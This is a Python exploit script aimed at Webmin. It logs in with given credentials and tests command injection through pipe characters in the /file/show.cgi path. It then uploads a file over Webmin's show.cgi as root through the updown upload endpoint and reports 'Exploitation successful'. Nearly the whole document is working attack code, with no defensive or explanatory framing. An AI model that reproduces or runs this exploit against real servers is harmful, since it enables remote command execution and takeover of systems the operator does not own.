from random import choice
from string import ascii_letters
from requests import post
import argparse
from sys import exit
from urllib3 import disable_warnings, HTTPResponse

boundary = ''.join(choice(ascii_letters) for i in range(29))


def upload(dir):
    payload = "-----------------------------{%s}\r\n" % boundary
    payload += "Content-Disposition: form-data; name=\"upload0\"; filename=\"show.cgi\"\r\n"
    payload += "Content-Type: application/octet-stream\r\n\r\n"
    payload += "#!/usr/local/bin/perl\n# show.cgi\n# Output some file for the browser\n\n"
    payload += "$trust_unknown_referers = 1;\nrequire './file-lib.pl';\n&ReadParse();\nuse POSIX;\n"
    payload += "$p = $ENV{'PATH_INFO'};\nif ($in{'type'}) {\n\t# Use the supplied content type\n\t"
    payload += "$type = $in{'type'};\n\t$download = 1;\n\t}\nelsif ($in{'format'} == 1) {\n\t"
    payload += "# Type comes from compression format\n\t$type = \"application/zip\";\n\t}\n"
    payload += "elsif ($in{'format'} == 2) {\n\t$type = \"application/x-gzip\";\n\t}\n"
    payload += "elsif ($in{'format'} == 3) {\n\t$type = \"application/x-tar\";\n\t}\nelse {\n\t"
    payload += "# Try to guess type from filename\n\t$type = &guess_mime_type($p, undef);\n\t"
    payload += "if (!$type) {\n\t\t# No idea .. use the 'file' command\n\t\t"
    payload += "$out = &backquote_command(\"file \".\n\t\t\t\t\t  quotemeta(&resolve_links($p)), 1);\n\t\t"
    payload += "if ($out =~ /text|script/) {\n\t\t\t$type = \"text/plain\";\n\t\t\t}\n\t\telse {\n\t\t\t"
    payload += "$type = \"application/unknown\";\n\t\t\t}\n\t\t}\n\t}\n\n# Dump the file\n&switch_acl_uid();\n"
    payload += "$temp = &transname();\nif (!&can_access($p)) {\n\t# ACL rules prevent access to file\n\t"
    payload += "&error_exit(&text('view_eaccess', &html_escape($p)));\n\t}\n$p = &unmake_chroot($p);\n\n"
    payload += "if ($in{'format'}) {\n\t# An archive of a directory was requested .. create it\n\t"
    payload += "$archive || &error_exit($text{'view_earchive'});\n\tif ($in{'format'} == 1) {\n\t\t"
    payload += "$p =~ s/\\.zip$//;\n\t\t}\n\telsif ($in{'format'} == 2) {\n\t\t$p =~ s/\\.tgz$//;\n\t\t}\n\t"
    payload += "elsif ($in{'format'} == 3) {\n\t\t$p =~ s/\\.tar$//;\n\t\t}\n\t-d $p || &error_exit($text{'view_edir'}.\" \".&html_escape($p));\n\t"
    payload += "if ($archive == 2 && $archmax > 0) {\n\t\t# Check if directory is too large to archive\n\t\tlocal $kb = &disk_usage_kb($p);\n\t\t"
    payload += "if ($kb*1024 > $archmax) {\n\t\t\t&error_exit(&text('view_earchmax', $archmax));\n\t\t\t}\n\t\t}\n\n\t"
    payload += "# Work out the base directory and filename\n\tif ($p =~ /^(.*\\/)([^\\/]+)$/) {\n\t\t$pdir = $1;\n\t\t"
    payload += "$pfile = $2;\n\t\t}\n\telse {\n\t\t$pdir = \"/\";\n\t\t$pfile = $p;\n\t\t}\n\n\t"
    payload += "# Work out the command to run\n\tif ($in{'format'} == 1) {\n\t\t"
    payload += "&has_command(\"zip\") || &error_exit(&text('view_ecmd', \"zip\"));\n\t\t"
    payload += "$cmd = \"zip -r $temp \".quotemeta($pfile);\n\t\t}\n\telsif ($in{'format'} == 2) {\n\t\t"
    payload += "&has_command(\"tar\") || &error_exit(&text('view_ecmd', \"tar\"));\n\t\t"
    payload += "&has_command(\"gzip\") || &error_exit(&text('view_ecmd', \"gzip\"));\n\t\t"
    payload += "$cmd = \"tar cf - \".quotemeta($pfile).\" | gzip -c >$temp\";\n\t\t}\n\t"
    payload += "elsif ($in{'format'} == 3) {\n\t\t&has_command(\"tar\") || &error_exit(&text('view_ecmd', \"tar\"));\n\t\t"
    payload += "$cmd = \"tar cf $temp \".quotemeta($pfile);\n\t\t}\n\n\tif ($in{'test'}) {\n\t\t"
    payload += "# Don't actually do anything if in test mode\n\t\t&ok_exit();\n\t\t}\n\n\t"
    payload += "# Run the command, and send back the resulting file\n\tlocal $qpdir = quotemeta($pdir);\n\t"
    payload += "local $out = `cd $qpdir ; ($cmd) 2>&1 </dev/null`;\n\tif ($?) {\n\t\tunlink($temp);\n\t\t"
    payload += "&error_exit(&text('view_ecomp', &html_escape($out)));\n\t\t}\n\tlocal @st = stat($temp);\n\t"
    payload += "print \"Content-length: $st[7]\\n\";\n\tprint \"Content-type: $type\\n\\n\";\n\t"
    payload += "open(FILE, $temp);\n\tunlink($temp);\n\twhile(read(FILE, $buf, 1024)) {\n\t\tprint $buf;\n\t\t}\n\t"
    payload += "close(FILE);\n\t}\nelse {\n\tif (!open(FILE, $p)) {\n\t\t# Unix permissions prevent access\n\t\t"
    payload += "&error_exit(&text('view_eopen', $p, $!));\n\t\t}\n\n\tif ($in{'test'}) {\n\t\t"
    payload += "# Don't actually do anything if in test mode\n\t\tclose(FILE);\n\t\t"
    payload += "&ok_exit();\n\t\t}\n\n\t@st = stat($p);\n\tprint \"X-no-links: 1\\n\";\n\t"
    payload += "print \"Content-length: $st[7]\\n\";\n\tprint \"Content-Disposition: Attachment\\n\" if ($download);\n\t"
    payload += "print \"Content-type: $type\\n\\n\";\n\tif ($type =~ /^text\\/html/i && !$in{'edit'}) {\n\t\t"
    payload += "while(read(FILE, $buf, 1024)) {\n\t\t\t$data .= $buf;\n\t\t\t}\n\t\tprint &filter_javascript($data);\n\t\t"
    payload += "}\n\telse {\n\t\twhile(read(FILE, $buf, 1024)) {\n\t\t\tprint $buf;\n\t\t\t}\n\t\t}\n\tclose(FILE);\n\t}\n\n"
    payload += "sub error_exit\n{\nprint \"Content-type: text/plain\\n\";\n"
    payload += "print \"Content-length: \",length($_[0]),\"\\n\\n\";\nprint $_[0];\nexit;\n}\n\n"
    payload += "sub ok_exit\n{\nprint \"Content-type: text/plain\\n\\n\";\nprint \"\\n\";\nexit;\n}"
    payload += "\r\n\r\n"
    payload += "-----------------------------{%s}\r\n" % boundary
    payload += "Content-Disposition: form-data; name=\"dir\"\r\n\r\n" + str(dir) + "\r\n"
    payload += "-----------------------------{%s}\r\n" % boundary
    payload += "Content-Disposition: form-data; name=\"user\"\r\n\r\nroot\r\n"
    payload += "-----------------------------{%s}\r\n" % boundary
    payload += "Content-Disposition: form-data; name=\"group_def\"\r\n\r\n1\r\n"
    payload += "-----------------------------{%s}\r\n" % boundary
    payload += "Content-Disposition: form-data; name=\"group\"\r\n\r\n\r\n"
    payload += "-----------------------------{%s}\r\n" % boundary
    payload += "Content-Disposition: form-data; name=\"zip\"\r\n\r\n0\r\n"
    payload += "-----------------------------{%s}\r\n" % boundary
    payload += "Content-Disposition: form-data; name=\"email_def\"\r\n\r\n1\r\n"
    payload += "-----------------------------{%s}\r\n" % boundary
    payload += "Content-Disposition: form-data; name=\"ok\"\r\n\r\nUpload\r\n"
    payload += "-----------------------------{%s}--\r\n" % boundary

    # print(payload)
    return payload


def check(url, data):
    r = post(url + "/session_login.cgi", data=data, cookies={"testing": "1"}, verify=False, allow_redirects=False)
    r.close()

    if r and r.status_code == 302 and "sid" in r.cookies.get_dict().keys():

        sid = r.cookies.get_dict().get("sid")

        if sid is not None:
            garbage1 = "a" * 4
            garbage2 = "echo " + "b" * 10

            r = post(url + "/file/show.cgi/bin/" + garbage1 + "|" + garbage2 + "|", cookies={"sid": sid}, verify=False)

            if r and r.status_code == 200 and str(r.reason).find("Document follows") > -1:
                return True

    return False


def exploit(url, data):
    r = post(url + "/session_login.cgi", data=data, cookies={"testing": "1"}, verify=False, allow_redirects=False)
    r.close()

    if r and r.status_code == 302 and "sid" in r.cookies.get_dict().keys():

        sid = r.cookies.get_dict().get("sid")

        headers2 = {
            "Referer": url + "/sysinfo.cgi?xnavigation=1"
        }

        cookie2 = {
            "redirect": str(1),
            "testing": str(1),
            "sid": sid
        }

        r2 = post(url + "/proc/index_tree.cgi?", verify=False, headers=headers2, cookies=cookie2)
        r2.close()

        if r2 and r2.status_code == 200 and r2.text.find("Running Processes") > -1:

            file_to_write = r2.text.split("perl")[-1].split("miniserv")[0] + "garbage_file.txt"
            # print("\n\nDirectory: ", file_to_write)

            headers3 = {
                "Referer": url + "/updown/?xnavigation=1",
                'Content-Type': 'multipart/form-data; boundary=---------------------------{' + boundary + '}'
            }

            try:
                r3 = post(url + "/updown/upload.cgi?id=154739243511", verify=False,
                          cookies=cookie2,
                          headers=headers3,
                          data=upload(file_to_write).encode("utf-8"))
                r3.close()
            except UnicodeEncodeError:
                print("Text error")
                return False

            if r3 and r3.status_code == 200 and r3.text.find(".. wrote") > -1:
                garbage2 = "echo " + "b" * 10
                # r4 = post(url + "/file/show.cgi/bin/" + garbage2 + "|" + "id|",
                #           cookies={"sid": cookie2.get("sid")},
                #           timeout=25,
                #           verify=False)
                # r4.close()
                return file_to_write

    return False


def main():
    global args
    parser = argparse.ArgumentParser()
    parser.add_argument("--host", dest="host", default="localhost", required=False, help="Webmin url")
    parser.add_argument("--port", dest="port", default=10000, required=False, help="Webmin port (default: 10000)")
    parser.add_argument("-u", "--user", dest="user", default="root", required=False, help="Webmin user")
    parser.add_argument("--pass", dest="password", default="admin", required=False, help="Webmin user password")

    try:
        args = parser.parse_args()
    except:
        # parser.print_help()
        exit(0)

    disable_warnings()

    URL = "https://" + args.host + ":" + str(args.port)
    DATA = {
        "page": "%2F",
        "user": args.user,
        "pass": args.password
    }

    if check(URL, DATA):
        dir = exploit(URL, DATA)
        if dir:
            print("Exploitation successful")
            print("File written to '%s'." % dir)
            return
    print("Version not vulnerable")


main()

